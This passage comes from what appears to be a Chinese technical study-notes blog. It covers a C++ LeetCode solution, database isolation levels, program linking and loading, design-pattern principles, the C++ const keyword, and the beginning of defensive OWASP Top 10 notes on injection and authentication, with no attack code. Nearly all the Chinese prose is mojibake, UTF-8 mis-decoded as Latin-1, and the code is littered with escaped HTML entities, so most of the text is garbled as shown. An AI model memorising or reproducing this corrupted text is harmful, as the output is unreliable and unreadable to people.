(head.x == g_row - 1) return true; for (auto d : dirs) { Pos nxt; nxt.x = head.x + d.first; nxt.y = head.y + d.second; // åæ ‡åˆæ³•ï¼Œä¸”è¿˜æœªè¢«æ·¹ if (nxt.x \u0026lt; g_row \u0026amp;\u0026amp; nxt.x \u0026gt;= 0 \u0026amp;\u0026amp; nxt.y \u0026lt; g_col \u0026amp;\u0026amp; nxt.y \u0026gt;= 0 \u0026amp;\u0026amp; !visited[nxt.x][nxt.y]) { // cout \u0026lt;\u0026lt; \u0026#34;goto: \u0026#34; \u0026lt;\u0026lt; nxt.x \u0026lt;\u0026lt; \u0026#34;,\u0026#34; \u0026lt;\u0026lt; nxt.y \u0026lt;\u0026lt; endl; // cout \u0026lt;\u0026lt; \u0026#34;This point is watered at day \u0026#34; \u0026lt;\u0026lt; watered[nxt] \u0026lt;\u0026lt; endl; q.push(nxt); visited[nxt.x][nxt.y] = 1; } } } return false; } int latestDayToCross(int row, int col, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; cells) { g_row = row; g_col = col; Pos p; g_cells = cells; int left = 0; int right = cells.size() - 2; while (left \u0026lt;= right) { int mid = (left + right) \u0026gt;\u0026gt; 1; if (hasRoute(mid)) left = mid + 1; else right = mid - 1; } return left - 1; } }; 14 LeetCode576. å‡ºç•Œçš„è·¯å¾„æ•° 576. å‡ºç•Œçš„è·¯å¾„æ•°\næœ€è¿‘æ€»æ˜¯æŒ‚æ¯æ—¥ä¸€é¢˜ï¼Œå¿ƒæ€å—åˆ°äº†ä¸å°çš„å½±å“å•Šâ€¦â€¦\nwdnmdè®°å¿†åŒ–æœç´¢è¿˜å¡æ—¶é—´å¤æ‚åº¦æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿï¼Ÿ\nå…³é”®å‰ªæï¼šå½“ä½¿ç”¨ maxMove æ­¥ç›´ä¸Š/ç›´ä¸‹/ç›´å·¦/ç›´å³éƒ½æ— æ³•åˆ°è¾¾è¾¹ç•Œçš„æ—¶å€™ï¼Œç›´æ¥è¿”å› 0 ã€‚\næ·¦ï¼ï¼\n15 æ•°æ®åº“å¹¶å‘å¯¼è‡´çš„é—®é¢˜ åœ¨ç½‘ä¸Šè‹¥å¹²èµ„æ–™ä¸­çœ‹åˆ°äº†ç›¸äº’çŸ›ç›¾çš„è§£é‡Šï¼Œç›´æ¥æ€’è€Œç¿»æ•™æï¼Œåº”è¯¥æ˜¯æ¯”è¾ƒæƒå¨çš„äº†å§â€¦â€¦\nç”±äº äº‹åŠ¡æ˜¯å¹¶å‘æ§åˆ¶çš„åŸºæœ¬å•ä½ ï¼Œå…¶ACIDç‰¹æ€§éœ€è¦å¾—åˆ°ä¿è¯ã€‚å¹¶å‘æ“ä½œå¸¦æ¥çš„æ•°æ®ä¸ä¸€è‡´æ€§åŒ…æ‹¬ä¸¢å¤±ä¿®æ”¹ã€ä¸å¯é‡å¤è¯»å’Œè¯»â€œè„â€æ•°æ®ã€‚\n15.1 ä¸¢å¤±ä¿®æ”¹ ä¸¤ä¸ªäº‹åŠ¡ T1 å’Œ T2 è¯»å…¥åŒä¸€æ•°æ®å¹¶ä¿®æ”¹ï¼Œ T2 æäº¤çš„ç»“æœç ´åäº† T1 æäº¤çš„ç»“æœï¼Œå¯¼è‡´ T1 çš„ä¿®æ”¹è¢«ä¸¢å¤±ã€‚\n15.2 ä¸å¯é‡å¤è¯» äº‹åŠ¡ T1 è¯»å–æ•°æ®åï¼Œäº‹åŠ¡ T2 æ‰§è¡Œæ›´æ–°æ“ä½œï¼Œä½¿ T1 æ— æ³•å†ç°å‰ä¸€æ¬¡è¯»å–ç»“æœã€‚æ ¹æ® T2 æ‰§è¡Œçš„æ“ä½œæ¥çœ‹ï¼Œä¸å¯é‡å¤è¯»åŒ…æ‹¬ä¸‰ç§æƒ…å†µï¼š\nï¼ˆ1ï¼‰äº‹åŠ¡ T1 è¯»å–æŸä¸€æ•°æ®åï¼Œäº‹åŠ¡ T2 å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚åˆ™ä½¿å¾— T1 ä¸¤æ¬¡è¯»å–çš„æ•°æ®æ˜¯ä¸ä¸€æ ·çš„ã€‚\nï¼ˆ2ï¼‰äº‹åŠ¡ T1 è¯»å–æŸä¸€æ•°æ®åï¼Œäº‹åŠ¡ T2 å¯¹å…¶è¿›è¡Œåˆ é™¤ã€‚å½“ T1 å†æ¬¡è¯»å–æ•°æ®æ—¶ï¼Œå‘ç°æŸäº›æ•°æ®æ¶ˆå¤±äº†ã€‚\nï¼ˆ3ï¼‰äº‹åŠ¡ T1 è¯»å–æŸä¸€æ•°æ®åï¼Œäº‹åŠ¡ T2 å¯¹å…¶è¿›è¡Œå¢æ·»ã€‚å½“ T1 å†æ¬¡æŒ‰ç…§ç›¸åŒçš„æ¡ä»¶è¯»å–æ•°æ®æ—¶ï¼Œå‘ç°å¤šäº†ä¸€äº›è®°å½•ã€‚\nåä¸¤ç§ä¸å¯é‡å¤è¯»æœ‰æ—¶ä¹Ÿç§°ä¸º å¹»å½± ç°è±¡ã€‚\n15.3 è¯»è„æ•°æ®ï¼ˆè„è¯»ï¼‰ è„è¯»æ˜¯æŒ‡äº‹åŠ¡ T1 ä¿®æ”¹æŸä¸€æ•°æ®å¹¶å°†å…¶å†™å›ç£ç›˜ï¼Œäº‹åŠ¡ T2 è¯»å–åŒä¸€æ•°æ®åï¼Œ T1 ç”±äºæŸç§åŸå› è¢«æ’¤é”€ï¼Œè¿™æ—¶è¢« T1 ä¿®æ”¹è¿‡çš„æ•°æ®æ¢å¤åŸå€¼ï¼Œ T2 è¯»å–åˆ°çš„æ•°æ®ä¸æ•°æ®åº“ä¸­çš„æ•°æ®å°±ä¸ä¸€è‡´äº†ï¼Œç§°è¿™äº›æ•°æ®ä¸º è„æ•°æ® ã€‚\n15.4 ä¸å¯é‡å¤è¯»å’Œå¹»è¯»çš„åŒºåˆ« æ ¹æ® [15.2èŠ‚](#15.2 ä¸å¯é‡å¤è¯») ä¸­å¯¹ä¸å¯é‡å¤è¯»çš„æè¿°ï¼Œæˆ‘ä»¬å¯ä»¥å°†åä¸¤ç§æƒ…å†µç§°ä¸º å¹»è¯» ã€‚\nç½‘ç»œä¸Šçš„å„ç§èµ„æ–™ï¼Œå¤šç”¨ ä¸å¯é‡å¤è¯» æ¥æŒ‡ä»£ç¬¬ä¸€ç§æƒ…å†µï¼Œè€Œç”¨ å¹»è¯» æ¥æŒ‡ä»£åä¸¤ç§æƒ…å†µã€‚è¿™æ ·ï¼Œä¸å¯é‡å¤è¯»å’Œå¹»è¯»çš„åŒºåˆ«å°±åœ¨äºï¼šä¸å¯é‡å¤è¯»æŒ‡çš„æ˜¯æ•°æ®å†…å®¹çš„ä¸ä¸€è‡´ï¼Œè€Œå¹»è¯»æŒ‡çš„æ˜¯æ•°æ®æ•°é‡çš„ä¸ä¸€è‡´ã€‚\nåœ¨ä½¿ç”¨é”æ¥å®ç°éš”ç¦»æœºåˆ¶çš„æ—¶å€™ï¼Œé’ˆå¯¹ä¸å¯é‡å¤è¯»åªéœ€è¦ä½¿ç”¨ è¡Œé” ï¼Œè€Œé’ˆå¯¹å¹»è¯»çš„ç°è±¡éœ€è¦ä½¿ç”¨ è¡¨é” ã€‚\n15.5 å››ä¸ªéš”ç¦»ç­‰çº§ äº‹åŠ¡çš„éš”ç¦»çº§åˆ«æœ‰å››ï¼Œå®ƒä»¬å¯¹è„è¯»ã€ä¸å¯é‡å¤è¯»å’Œå¹»è¯»çš„è§£å†³æ•ˆæœåˆ†åˆ«å¦‚ä¸‹ï¼š\näº‹åŠ¡éš”ç¦»çº§åˆ« è„è¯» ä¸å¯é‡å¤è¯» å¹»è¯» è¯»æœªæäº¤ æ˜¯ æ˜¯ æ˜¯ è¯»å·²æäº¤ å¦ æ˜¯ æ˜¯ å¯é‡å¤è¯» å¦ å¦ æ˜¯ ä¸²è¡ŒåŒ– å¦ å¦ å¦ 16 ç¨‹åºè£…å…¥å’Œé“¾æ¥ åˆ›å»ºè¿›ç¨‹é¦–å…ˆè¦å°†ç¨‹åºå’Œæ•°æ®è£…å…¥å†…å­˜ã€‚å°†ç”¨æˆ·æºç¨‹åºå˜ä¸ºå¯åœ¨å†…å­˜ä¸­æ‰§è¡Œçš„ç¨‹åºï¼Œé€šå¸¸éœ€è¦ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š\né¢„å¤„ç†ã€‚å±•å¼€å¤´æ–‡ä»¶ã€å®æ›¿æ¢ã€å»æ‰æ³¨é‡Šã€æ¡ä»¶ç¼–è¯‘ã€‚ ç¼–è¯‘ã€‚å°†ä»£ç è½¬æ¢æˆæ±‡ç¼–ä»£ç ï¼Œå¹¶åœ¨è¿™ä¸ªæ­¥éª¤ä¸­å®Œæˆä¸¤ä»¶å·¥ä½œï¼š æ¯ä¸ªæ–‡ä»¶ä¸­äº§ç”Ÿä¸€ä¸ªå‡½æ•°åœ°å€ç¬¦è¡¨ï¼Œå­˜å‚¨ç€å½“å‰æ–‡ä»¶å†…åŒ…å«çš„å„ä¸ªå‡½æ•°çš„åœ°å€ï¼› è°ƒç”¨å‡½æ•°çš„ä»£ç ä¼šç¼–è¯‘ä¸º call æŒ‡ä»¤ï¼Œè€Œ call æŒ‡ä»¤è·Ÿéšçš„åœ°å€ä¸Šæ˜¯ä¸€æ¡ jmp æŒ‡ä»¤ï¼Œ jmp æŒ‡ä»¤è·Ÿéšçš„åœ°å€æ‰æ˜¯è¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ã€‚ä¸º call æŒ‡ä»¤è¡¥å……ä¸Šåœ°å€æ˜¯åœ¨é“¾æ¥çš„æ—¶å€™æ‰å®Œæˆçš„ã€‚ æ±‡ç¼–ã€‚å°†ç¼–è¯‘å‡ºçš„æ–‡ä»¶è½¬æ¢æˆæœºå™¨ç ã€‚ é“¾æ¥ã€‚å°†ç¼–è¯‘åå½¢æˆçš„ä¸€ç»„ç›®æ ‡æ¨¡å—åŠæ‰€éœ€çš„åº“å‡½æ•°é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„è£…å…¥æ¨¡å—ã€‚ è£…å…¥ã€‚å°†ç¨‹åºè£…å…¥å†…å­˜æ‰§è¡Œã€‚ ç¨‹åºçš„é“¾æ¥æœ‰ä¸‰ç§æ–¹å¼ï¼š\né™æ€é“¾æ¥ã€‚åœ¨ç¨‹åºè¿è¡Œå‰ï¼Œå°†å„ç›®æ ‡æ¨¡å—å’Œæ‰€éœ€çš„åº“å‡½æ•°é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„å¯æ‰§è¡Œç¨‹åºï¼Œä»¥åä¸å†æ‹†å¼€ã€‚ è£…å…¥æ—¶åŠ¨æ€é“¾æ¥ã€‚è£…å…¥å†…å­˜æ—¶è¾¹è£…å…¥è¾¹é“¾æ¥ã€‚ è¿è¡Œæ—¶åŠ¨æ€é“¾æ¥ã€‚å¯¹äºæŸäº›ç›®æ ‡æ¨¡å—çš„é“¾æ¥ï¼Œæ˜¯åœ¨ç¨‹åºæ‰§è¡Œä¸­éœ€è¦è¯¥ç›®æ ‡æ¨¡å—æ—¶æ‰æ‰§è¡Œçš„ã€‚å…¶ä¼˜ç‚¹æ˜¯ä¾¿äºä¿®æ”¹å’Œæ›´æ–°ï¼Œä¾¿äºå®ç°å¯¹ç›®æ ‡æ¨¡å—çš„å…±äº«ã€‚ æ¨¡å—åœ¨è£…å…¥å†…å­˜æ—¶ï¼Œä¹Ÿæœ‰ä¸‰ç§æ–¹å¼ï¼š\nç»å¯¹è£…å…¥ã€‚åœ¨ç¼–è¯‘æ—¶ï¼Œè‹¥çŸ¥é“ç¨‹åºå°†é©»ç•™åœ¨å†…å­˜çš„æŸä¸ªä½ç½®ï¼Œåˆ™ç¼–è¯‘ç¨‹åºå°†äº§ç”Ÿç»å¯¹åœ°å€çš„ç›®æ ‡ä»£ç ã€‚ç»å¯¹è£…å…¥ç¨‹åºæŒ‰ç…§è£…å…¥æ¨¡å—ä¸­çš„åœ°å€ï¼Œå°†ç¨‹åºå’Œæ•°æ®è£…å…¥å†…å­˜ã€‚è¯¥æ–¹å¼åªä½¿ç”¨äºå•é“ç¨‹åºç¯å¢ƒï¼Œç»å¯¹åœ°å€å¯åœ¨ç¼–è¯‘æˆ–æ±‡ç¼–æ—¶ç»™å‡ºï¼Œä¹Ÿå¯ç”±ç¨‹åºå‘˜ç›´æ¥èµ‹äºˆã€‚ å¯é‡å®šä½è£…å…¥ã€‚å¤šé“ç¨‹åºç¯å¢ƒä¸‹ï¼Œæ¨¡å—ä¸­ä½¿ç”¨çš„åœ°å€ä¸€èˆ¬æ˜¯ç›¸å¯¹åœ°å€ï¼ˆç›¸å¯¹äºèµ·å§‹åœ°å€ 0 ï¼‰ã€‚å¯é‡å®šä½è£…å…¥ä¼šåœ¨è£…å…¥æ—¶å°†æ¨¡å—ä¸­çš„ç›¸å¯¹åœ°å€ä¿®æ”¹ä¸ºç»å¯¹åœ°å€ï¼ˆç›¸å¯¹äºè£…å…¥çš„ä½ç½®ï¼‰ã€‚**è£…å…¥æ—¶å¯¹ç›®æ ‡ç¨‹åºä¸­æŒ‡ä»¤å’Œæ•°æ®çš„ä¿®æ”¹è¿‡ç¨‹ç§°ä¸º é‡å®šä½ ï¼Œåœ°å€å˜æ¢é€šå¸¸æ˜¯åœ¨è£…å…¥æ—¶ä¸€æ¬¡æ€§å®Œæˆçš„ï¼Œåˆç§°ä¸º é™æ€é‡å®šä½ **ã€‚ è¿è¡Œæ—¶åŠ¨æ€è£…å…¥ã€‚è£…å…¥ç¨‹åºæŠŠæ¨¡å—è£…å…¥å†…å­˜åï¼Œå¹¶ä¸ç«‹å³æŠŠè£…å…¥æ¨¡å—ä¸­çš„ç›¸å¯¹åœ°å€æ›¿æ¢ä¸ºç»å¯¹åœ°å€ï¼Œè€Œæ˜¯æŠŠè¿™ç§è½¬æ¢æ¨è¿Ÿåˆ°ç¨‹åºçœŸæ­£è¦æ‰§è¡Œæ—¶æ‰è¿›è¡Œã€‚ è¿™ç§æ–¹å¼éœ€è¦ä¸€ä¸ªé‡å®šä½å¯„å­˜å™¨çš„æ”¯æŒ ã€‚ Reference\n[1] ç‹é“è®ºå›.2021å¹´æ“ä½œç³»ç»Ÿè€ƒç ”å¤ä¹ æŒ‡å¯¼[M].åŒ—äº¬:ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾,2020:129::131\n[2] ç¼–è¯‘çš„æ•´ä¸ªè¿‡ç¨‹ï¼šé¢„ç¼–è¯‘ã€ç¼–è¯‘ã€æ±‡ç¼–ã€é“¾æ¥ - mhq_martin - åšå®¢å›­ (cnblogs.com)\n17 è®¾è®¡æ¨¡å¼ç®€è¿° è®¾è®¡æ¨¡å¼ï¼ˆDesign Patternï¼‰ä»£è¡¨äº†æœ€ä½³çš„å®è·µï¼Œé€šå¸¸è¢«æœ‰ç»éªŒçš„é¢å‘å¯¹è±¡çš„è½¯ä»¶å¼€å‘äººå‘˜æ‰€é‡‡ç”¨ã€‚è®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å¼€å‘äººå‘˜åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­é¢ä¸´çš„ä¸€èˆ¬é—®é¢˜çš„è§£å†³æ–¹æ¡ˆã€‚è¿™äº›è§£å†³æ–¹æ¡ˆæ˜¯ä¼—å¤šè½¯ä»¶å¼€å‘äººå‘˜ç»è¿‡ç›¸å½“é•¿çš„ä¸€æ®µæ—¶é—´çš„è¯•éªŒå’Œé”™è¯¯æ€»ç»“å‡ºæ¥çš„ã€‚\nè®¾è®¡æ¨¡å¼çš„ç›®çš„æ˜¯ä¸ºäº†å¯é‡ç”¨ä»£ç ï¼Œæé«˜ä»£ç çš„å¯æ‰©å±•æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚\nè®¾è®¡æ¨¡å¼ä¸»è¦æœ‰å‡ ç§ç±»å‹ï¼š\nåˆ›å»ºå‹æ¨¡å¼ ã€‚è¯¥æ¨¡å¼é‡ç‚¹å…³æ³¨å¦‚ä½•åˆ›å»ºå¯¹è±¡ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶éšè—åˆ›å»ºé€»è¾‘ï¼Œä»è€Œä½¿å¯¹è±¡çš„åˆ›å»ºå’Œä½¿ç”¨ç›¸äº’åˆ†ç¦»ã€‚ ç»“æ„å‹æ¨¡å¼ ã€‚è¯¥æ¨¡å¼é‡ç‚¹è€ƒè™‘ç±»å’Œå¯¹è±¡çš„ç»„åˆï¼Œç›®çš„æ˜¯è·å¾—æ›´å¥½ã€æ›´çµæ´»çš„ç»“æ„ã€‚ è¡Œä¸ºå‹æ¨¡å¼ ã€‚è¯¥æ¨¡å¼é‡ç‚¹å…³æ³¨ç®—æ³•å’Œå¯¹è±¡ä¹‹é—´çš„èŒè´£åˆ†é…ï¼Œé€šè¿‡å®‰æ’å¯¹è±¡ä¹‹é—´çš„åˆç†é€šä¿¡æ¥æ›´å¥½åœ°å®Œæˆæ•´ä½“çš„ä»»åŠ¡ã€‚ è®¾è®¡æ¨¡å¼æœ‰å¦‚ä¸‹å‡ ä¸ªåŸåˆ™ï¼š\nå¼€é—­åŸåˆ™ ã€‚è½¯ä»¶ å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ ã€‚ç®€è€Œè¨€ä¹‹ï¼Œç¨‹åºåœ¨è¿›è¡Œå‡çº§çš„æ—¶å€™ï¼Œåªå¯¹ç°æœ‰æ¨¡å—è¿›è¡Œæ‰©å±•ï¼Œè€Œå°½é‡ä¸å¯¹åŸæœ‰ä»£ç è¿›è¡Œä¿®æ”¹ã€‚\né‡Œæ°æ›¿æ¢åŸåˆ™ ã€‚å­ç±»èƒ½å¤Ÿå®Œå…¨æ›¿æ¢çˆ¶ç±»ã€‚æ˜¾ç„¶ï¼Œåªæœ‰å½“å­ç±»æ›¿æ¢æ‰çˆ¶ç±»ï¼Œä¸”åŸæœ‰çš„æ–¹æ³•ä¸å—å½±å“æ—¶ï¼Œçˆ¶ç±»æ‰ç®—çœŸæ­£å¾—åˆ°äº†å¤ç”¨ã€‚\nä¾èµ–å€’è½¬åŸåˆ™ ã€‚é’ˆå¯¹æ¥å£ç¼–ç¨‹ï¼Œä¾èµ–äºæŠ½è±¡è€Œä¸ä¾èµ–äºå…·ä½“ã€‚\næ¥å£éš”ç¦»åŸåˆ™ ã€‚ä½¿ç”¨å¤šä¸ªéš”ç¦»çš„æ¥å£ï¼Œæ¯”ä½¿ç”¨å•ä¸ªæ¥å£æ›´å¥½ã€‚æˆ‘è®¤ä¸ºè¯¥åŸåˆ™çš„æ€æƒ³æ˜¯å°†å¤æ‚é—®é¢˜æ‹†è§£ï¼Œé™ä½ç±»ä¹‹é—´çš„è€¦åˆã€‚\nè¿ªç±³ç‰¹æ³•åˆ™ ã€‚åˆç§°æœ€å°çŸ¥é“åŸåˆ™ï¼Œä¸€ä¸ªå®ä½“åº”è¯¥å°½é‡å°‘åœ°ä¸å…¶ä»–å®ä½“å‘ç”Ÿä½œç”¨ï¼Œä½¿å¾—ç³»ç»Ÿæ¨¡å—ç›¸å¯¹ç‹¬ç«‹ã€‚\nåˆæˆå¤ç”¨åŸåˆ™ ã€‚å°½é‡ä½¿ç”¨åˆæˆ/èšåˆçš„æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨ç»§æ‰¿ã€‚è€Œè‹¥ä½¿ç”¨ç»§æ‰¿ï¼Œåˆ™éœ€è¦éµå®ˆé‡Œæ°æ›¿æ¢åŸåˆ™ã€‚\næ³¨ã€ä½¿ç”¨ç»§æ‰¿çš„æ–¹å¼è¿›è¡Œå¤ç”¨è™½ç„¶æ¯”è¾ƒç®€å•ï¼Œä½†ç ´åäº†çˆ¶ç±»çš„å°è£…æ€§ã€‚ä½¿ç”¨åˆæˆæˆ–èšåˆå¤ç”¨ï¼ŒæŒ‡çš„æ˜¯å°†å·²æœ‰å¯¹è±¡çº³å…¥æ–°å¯¹è±¡ä¸­ï¼Œä½¿ä¹‹æˆä¸ºæ–°å¯¹è±¡çš„ä¸€éƒ¨åˆ†ï¼Œè¯¥æ–¹æ³•åˆè¢«ç§°ä¸ºâ€œé»‘ç®±â€å¤ç”¨ã€‚\nRefernence:\n[1] [åˆæˆå¤ç”¨åŸåˆ™â€”â€”é¢å‘å¯¹è±¡è®¾è®¡åŸåˆ™ (biancheng.net)](http://c.biancheng.net/view/1333.html#:~:text=åˆæˆå¤ç”¨åŸåˆ™çš„é‡è¦æ€§ 1 å®ƒç»´æŒäº†ç±»çš„å°è£…æ€§ã€‚å› ä¸ºæˆåˆ†å¯¹è±¡çš„å†…éƒ¨ç»†èŠ‚æ˜¯æ–°å¯¹è±¡çœ‹ä¸è§çš„ï¼Œæ‰€ä»¥è¿™ç§å¤ç”¨åˆç§°ä¸ºâ€œé»‘ç®±â€å¤ç”¨ã€‚,2 æ–°æ—§ç±»ä¹‹é—´çš„è€¦åˆåº¦ä½ã€‚è¿™ç§å¤ç”¨æ‰€éœ€çš„ä¾èµ–è¾ƒå°‘ï¼Œæ–°å¯¹è±¡å­˜å–æˆåˆ†å¯¹è±¡çš„å”¯ä¸€æ–¹æ³•æ˜¯é€šè¿‡æˆåˆ†å¯¹è±¡çš„æ¥å£ã€‚ 3 å¤ç”¨çš„çµæ´»æ€§é«˜ã€‚è¿™ç§å¤ç”¨å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€è¿›è¡Œï¼Œæ–°å¯¹è±¡å¯ä»¥åŠ¨æ€åœ°å¼•ç”¨ä¸æˆåˆ†å¯¹è±¡ç±»å‹ç›¸åŒçš„å¯¹è±¡ã€‚)\n[2] è®¾è®¡æ¨¡å¼ç®€ä»‹ | èœé¸Ÿæ•™ç¨‹ (runoob.com)\n[3] è®¾è®¡æ¨¡å¼ - å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ (liaoxuefeng.com)\n18 C++ä¸­çš„constå…³é”®å­— æ— è®º const å…³é”®å­—å‡ºç°åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Œä¸ç®¡å®ƒç”¨äºä¿®é¥°æŒ‡é’ˆã€å˜é‡ã€å‡½æ•°æˆ–ç±»ï¼Œå…¶æ ¸å¿ƒä½œç”¨éƒ½æ˜¯é˜²æ­¢å®ƒä¿®é¥°çš„ç›®æ ‡å—åˆ°ä¿®æ”¹ã€‚\n18.1 constå˜é‡ const å…³é”®å­—æŒ‡å®šä¸€ä¸ªå˜é‡çš„å€¼ä¸ºå¸¸å€¼ï¼Œç¼–è¯‘å™¨å°†ç¦æ­¢å¯¹è¿™ä¸€å˜é‡çš„ä¿®æ”¹ã€‚\n// constant_values1.cpp int main() { const int i = 5; i = 10; // C3892 i++; // C2105 } æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ const å…³é”®å­—æ¥ä»£æ›¿ #define ï¼Œè¿™ä¸€åšæ³•ä¼šä½¿å¾—ç¼–è¯‘å™¨å¯¹è¿™ä¸€å¸¸å˜é‡è¿›è¡Œ ç±»å‹æ£€æŸ¥ ï¼Œè€Œä½¿ç”¨å®å®šä¹‰å¾—åˆ°çš„å¯¹è±¡åªæ˜¯åœ¨ç¼–è¯‘ä¹‹å‰è¿›è¡Œé¢„å¤„ç†æ›¿æ¢ï¼Œæ²¡æœ‰ç±»å‹æ£€æŸ¥ã€‚\nå¦‚æœæ­¤ç±»å˜é‡ä½œä¸ºä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ åˆå§‹åŒ–åˆ—è¡¨ æ¥è¿›è¡Œåˆå§‹åŒ–ã€‚\nåœ¨Cè¯­è¨€ä¸­ï¼Œ const å˜é‡é»˜è®¤ä¸º å¤–éƒ¨é“¾æ¥ ç±»å‹ï¼Œåˆ™å…¶åªèƒ½å‡ºç°åœ¨å•ä¸ª æºæ–‡ä»¶ ä¸­ï¼›è€ŒC++ä¸­çš„ const å˜é‡ä¸ä¹‹ç›¸åï¼Œè€Œæˆ‘ä»¬çŸ¥é“å†…éƒ¨é“¾æ¥ç±»å‹çš„å˜é‡å¯ä»¥å‡ºç°åœ¨ å¤´æ–‡ä»¶ ä¸­ï¼›å½“ç„¶ï¼Œå¦‚æœå¸Œæœ›å…¶ä»–æºæ–‡ä»¶ä¹Ÿè®¿é—®åˆ°è¿™ä¸€ const å˜é‡ï¼Œåˆ™éœ€è¦ä½¿ç”¨ extern æ¥å£°æ˜ã€‚\nconst å…³é”®å­—ä¹Ÿå¯ç”¨äºæŒ‡é’ˆçš„å£°æ˜å½“ä¸­ï¼š\n// constant_values3.cpp int main() { char *mybuf = 0, *yourbuf; char *const aptr = mybuf; *aptr = \u0026#39;a\u0026#39;; // OK aptr = yourbuf; // C3892 } ä»¥ä¸€ç§ç®€å•çš„æ–¹å¼æ¥åŒºåˆ† å¸¸æŒ‡é’ˆ å’Œ å¸¸é‡æŒ‡é’ˆ ï¼šå¦‚æœ const å‡ºç°åœ¨æ˜Ÿå· * åé¢ï¼Œåˆ™å®ƒä¿®é¥°çš„æ˜¯æŒ‡é’ˆå˜é‡æœ¬èº«ï¼›å¦‚æœ const å‡ºç°åœ¨æ˜Ÿå· * å‰é¢ï¼Œåˆ™å®ƒä¿®é¥°çš„æ˜¯æŒ‡é’ˆæŒ‡å‘çš„å˜é‡ã€‚\nå¦‚æœéš¾ä»¥åŒºåˆ†ï¼Œä¸å¦¨ä»è‹±æ–‡çš„è§’åº¦å‡ºå‘ï¼Œè§‚å¯Ÿä»¥ä¸‹ä¸¤ä¸ªå˜é‡ï¼š\nconst char* p1; // pointer to constant data char* const p2; // constant pointer æ˜¯ä¸æ˜¯å¥½æ‡‚äº†ä¸€äº›ï¼Ÿ\n18.2 constæˆå‘˜å‡½æ•° å£°æ˜ä¸€ä¸ªå¸¦æœ‰ const å…³é”®å­—çš„æˆå‘˜å‡½æ•°è¡¨æ˜è¯¥å‡½æ•°æ˜¯ä¸€ä¸ªâ€œåªè¯»â€å‡½æ•°ï¼Œå…¶å†…éƒ¨ä»£ç å°†ä¸ä¼šæ”¹å˜ä»»ä½•æˆå‘˜å˜é‡ã€‚è¿™ç±»å‡½æ•°ä¸èƒ½ä¿®æ”¹ä»»ä½•éé™æ€å˜é‡ã€ä¸”åªèƒ½è°ƒç”¨å…¶ä»–çš„ const å‡½æ•°ã€‚\nå£°æ˜å’Œå®šä¹‰ const å‡½æ•°çš„åŠæ³•æ˜¯åœ¨å‡½æ•°å½¢å‚çš„å°æ‹¬å·åé¢åŠ ä¸Š const å…³é”®å­—ã€‚\n// constant_member_function.cpp class Date { public: Date( int mn, int dy, int yr ); int getMonth() const; // A read-only function void setMonth( int mn ); // A write function; can\u0026#39;t be const private: int month; }; int Date::getMonth() const { return month; // Doesn\u0026#39;t modify anything } void Date::setMonth( int mn ) { month = mn; // Modifies data member } int main() { Date MyDate( 7, 4, 1998 ); const Date BirthDate( 1, 18, 1953 ); MyDate.setMonth( 4 ); // Okay BirthDate.getMonth(); // Okay BirthDate.setMonth( 4 ); // C2662 Error } 19 OWASP top 10ï¼ˆ2017ï¼‰ 19.1 æ³¨å…¥ è§£é‡Š ï¼šè¯¥æ¼æ´çš„æ ¸å¿ƒæ˜¯ç¼ºä¹å¯¹Webåº”ç”¨ç¨‹åºä½¿ç”¨çš„æ•°æ®çš„éªŒè¯å’Œæ¸…ç†ã€‚ä»»ä½•æ¥å—å‚æ•°ä½œä¸ºè¾“å…¥çš„å†…å®¹éƒ½å¯èƒ½å—åˆ°æ³¨å…¥æ”»å‡»ã€‚\né˜²æŠ¤ ï¼š\nä½¿ç”¨å®‰å…¨çš„APIã€‚ å¯¹è¾“å…¥è®¾ç½®ç™½åå•ï¼Œæˆ–è€…ç›¸å…³è¾“å…¥éªŒè¯ã€‚ è½¬ä¹‰ç‰¹æ®Šè®°å½•ã€‚ åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨ LIMIT æˆ–å…¶ä»–SQLæ§ä»¶ï¼Œé˜²æ­¢SQLæ³¨å…¥æ—¶å¤§é‡åœ°æ³„éœ²è®°å½•ã€‚ï¼ˆè€ƒè™‘æœ€åæƒ…å†µâ€¦â€¦ï¼‰ 19.2 å¤±æ•ˆçš„èº«ä»½è®¤è¯ è§£é‡Š ï¼šè¯¥æ¼æ´çš„æ ¸å¿ƒæ˜¯èº«ä»½è®¤è¯æœºåˆ¶åœ¨æŸå¤„å®ç°ä¸Šå­˜åœ¨é—®é¢˜ã€‚å¦‚ä½¿ç”¨å•å› ç´ èº«ä»½è®¤è¯ã€ä½¿ç”¨å¼±å£ä»¤ã€åœ¨ç”¨æˆ·æ³¨é”€ä¹‹åæ²¡æœ‰åŠæ—¶æ¸…é™¤Sessionã€åœ¨URLä¸­æš´éœ²ä¼šè¯IDç­‰ã€‚\né˜²æŠ¤ ï¼š\nå¤šå› ç´ èº«ä»½è®¤è¯ã€‚ å¼±å£ä»¤æ£€æŸ¥ã€‚ ç»Ÿä¸€æ³¨å†Œã€å‡­æ®æ¢å¤ç­‰æ¥å£ï¼Œé˜²æ­¢ç”¨æˆ·æšä¸¾æ”»å‡»ã€‚ ä¼šè¯IDçš„åˆç†ç®¡ç†ï¼Œå¦‚ç™»å½•ä¹‹åç”Ÿæˆé«˜åº¦éšæœºçš„ä¼šè¯IDã€å¦¥å–„å­˜å‚¨ï¼ˆè‚¯å®šä¸èƒ½å‡ºç°åœ¨URLé‡Œâ€¦â€¦ï¼‰ã€ç™»å‡ºä¹‹ååŠæ—¶é”€æ¯ã€‚ 19.3 